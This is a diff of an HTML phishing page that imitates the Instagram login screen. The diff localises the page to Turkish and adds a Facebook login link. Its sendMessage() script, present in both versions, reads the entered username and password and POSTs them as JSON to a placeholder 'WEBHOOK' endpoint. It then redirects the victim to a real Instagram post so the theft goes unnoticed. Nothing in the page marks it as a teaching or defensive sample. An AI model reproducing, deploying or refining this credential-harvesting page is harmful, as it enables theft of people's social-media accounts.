@@ -1,11 +1,15 @@
 <head>
-  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
+  <link
+    rel="Icon"
+    type="image/x-icon"
+    href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png"
+  />
   <title>Instagram</title>
 </head>
 <body>
   <span id="root">
     <section class="section-all">
-      <link rel="stylesheet" href="css.css">
+      <link rel="stylesheet" href="css.css" />
       <!-- 1-Role Main -->
       <main class="main" role="main">
         <div class="wrapper">
@@ -13,99 +17,197 @@
             <div class="content">
               <div class="login-box">
                 <div class="header">
-                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                </div><!-- Header end -->
+                  <img
+                    class="logo"
+                    src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                    alt="Instagram"
+                  />
+                </div>
+                <!-- Header end -->
                 <div class="form-wrap">
                   <form class="form">
+                    <div class="input-box">
+                      <input
+                        type="text"
+                        id="username"
+                        placeholder="Telefon numarası, kullanıcı adı veya e-posta"
+                        aria-required="true"
+                        maxlength="30"
+                        autocapitalize="off"
+                        autocorrect="off"
+                        name="username"
+                        required
+                      />
+                    </div>
 
                     <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
-                    </div>  
-
-                    <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                    </div>  
+                      <input
+                        type="password"
+                        name="password"
+                        id="password"
+                        placeholder="Şifre"
+                        maxlength="30"
+                        aria-required="true"
+                        autocapitalize="off"
+                        autocorrect="off"
+                        required
+                      />
+                    </div>
 
                     <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
-                    </span>  
+                      <button
+                        class="btn"
+                        type="button"
+                        name="submit"
+                        onclick="sendMessage()"
+                      >
+                        Giriş yap
+                      </button>
+                      
+                      <div>
+                        <p class="line">YA DA</p>
+                      </div>
 
-                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
+                      <div class="button-box">
+                        <a href="https://www.facebook.com/login.php"><img class="logo-mini" src="https://external-content.duckduckgo.com/iu/?u=http%3A%2F%2Fclipart-library.com%2Fnew_gallery%2F377-3776210_facebook-logo-vector-logovectornet-logo-facebook-2019-png.png&f=1&nofb=1&ipt=bc2b2e5c671c37216409ad92462a81ed72ef6f413fca6f6f9061d5034ef39da9&ipo=images">Facebook ile Giriş Yap</a>
+                      </div>
+
+                    </span>
+                    <a
+                    class="forgot"
+                    href="https://www.instagram.com/accounts/password/reset"
+                    >Şifreni mi unuttun?</a
+                    >
                   </form>
-                </div> <!-- Form-wrap end -->
-              </div> <!-- Login-box end -->
+                </div>
+                <!-- Form-wrap end -->
+              </div>
+              <!-- Login-box end -->
 
               <div class="login-box">
-                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
-              </div> <!-- Signup-box end -->
+                <p class="text">
+                  Hesabın yok mu?<a
+                    href="https://www.instagram.com/accounts/emailsignup"
+                    >Kaydol</a
+                  >
+                </p>
+              </div>
+              <!-- Signup-box end -->
 
               <div class="app">
-                <p>Get the app.</p>
+                <p>Uygulamayı indir.</p>
                 <div class="app-img">
-                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
+                  <a
+                    href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8"
+                  >
+                    <img
+                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"
+                    />
                   </a>
-                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                  </a>  
-                </div>  <!-- App-img end-->
-              </div> <!-- App end -->
-            </div> <!-- Content end -->
+                  <a
+                    href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"
+                  >
+                    <img
+                      src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
+                    />
+                  </a>
+                </div>
+                <!-- App-img end-->
+              </div>
+              <!-- App end -->
+            </div>
+            <!-- Content end -->
           </article>
-        </div> <!-- Wrapper end -->
+        </div>
+        <!-- Wrapper end -->
       </main>
 
       <!-- 2-Role Footer -->
       <footer class="footer" role="contentinfo">
         <div class="footer-container">
-
           <nav class="footer-nav" role="navigation">
             <ul>
-			  <li><a href=""></a></li>
-              <li><a href="https://about.instagram.com">About Us</a></li>
-              <li><a href="https://help.instagram.com">Support</a></li>
+              <li><a href=""></a></li>
+              <li><a href="https://about.meta.com/">Meta</a></li>
+              <li><a href="https://about.instagram.com">Hakkında</a></li>
               <li><a href="https://about.instagram.com/blog">Blog</a></li>
-              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
-              <li><a href="https://www.instagram.com/developer">Api</a></li>
-              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
-              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
-              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
-			  <li><a href="">Intsagram</a></li>
+              <li>
+                <a href="https://about.instagram.com/about-us/careers"
+                  >İş Fırsatları</a
+                >
+              </li>
+              <li><a href="https://help.instagram.com">Yardım</a></li>
+              <li><a href="https://www.instagram.com/developer">API</a></li>
+              <li>
+                <a href="https://help.instagram.com/519522125107875"
+                  >Gizlilik</a
+                >
+              </li>
+              <li>
+                <a href="https://help.instagram.com/581066165581870"
+                  >Koşullar</a
+                >
+              </li>
+              <li>
+                <a href="https://www.instagram.com/explore/locations/"
+                  >Konumlar</a
+                >
+              </li>
+              <li>
+                <a href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+              </li>
+              <li><a href="https://www.threads.net/">Threads</a></li>
+              <li>
+                <a
+                  href="https://l.instagram.com/?u=https%3A%2F%2Fwww.facebook.com%2Fhelp%2Finstagram%2F261704639352628&e=AT3G53cAbM-R_YWCee8qzDTZShiEcpozSQSTngndcGzqKiBgCcc79rGhFTbCmiwbSjJ7hnrwV-uG2jl4dtgDmKqYkRXLIZryK8So5XFDoGBhM8jNQvGm43D7RqhstMAzfLGQZAASciTswKP0-xxF3g"
+                  >Kişi Yükleme ve Hesabı Olmayan Kişiler</a
+                >
+              </li>
+              <li>
+                <a href="https://about.meta.com/technologies/meta-verified/"
+                  >Meta Verified</a
+                >
+              </li>
             </ul>
           </nav>
 
-          <span class="footer-logo">&copy; 2021 Instagram</span>
-        </div> <!-- Footer container end -->
+          <span class="footer-logo">&copy; 2023 Instagram from Meta</span>
+        </div>
+        <!-- Footer container end -->
       </footer>
-      
     </section>
-  </span> <!-- Root -->
+  </span>
+  <!-- Root -->
 
   <!-- Select Link -->
   <script type="text/javascript">
     function la(src) {
-      window.location=src;
+      window.location = src;
     }
   </script>
 
   <script>
-  function sendMessage() {
-  function sleep(milliseconds) {
-  const date = Date.now();
-  let currentDate = null;
-  do {
-    currentDate = Date.now();
-  } while (currentDate - date < milliseconds);
-}
-    var request = new XMLHttpRequest();
-    request.open("POST", "WEBHOOK");
-    request.setRequestHeader('Content-type', 'application/json');
-    var params = {
-      content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
+    function sendMessage() {
+      function sleep(milliseconds) {
+        const date = Date.now();
+        let currentDate = null;
+        do {
+          currentDate = Date.now();
+        } while (currentDate - date < milliseconds);
+      }
+      var request = new XMLHttpRequest();
+      request.open("POST", "WEBHOOK");
+      request.setRequestHeader("Content-type", "application/json");
+      var params = {
+        content:
+          "> **USERNAME  : **" +
+          document.getElementById("username").value +
+          "\n> **PASSWORD : **" +
+          document.getElementById("password").value,
+      };
+      request.send(JSON.stringify(params));
+      sleep(400);
+      window.location.replace("https://www.instagram.com/p/By7NkskoTip");
     }
-    request.send(JSON.stringify(params));
-	sleep(400)
-	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
-  }
   </script>
 </body>
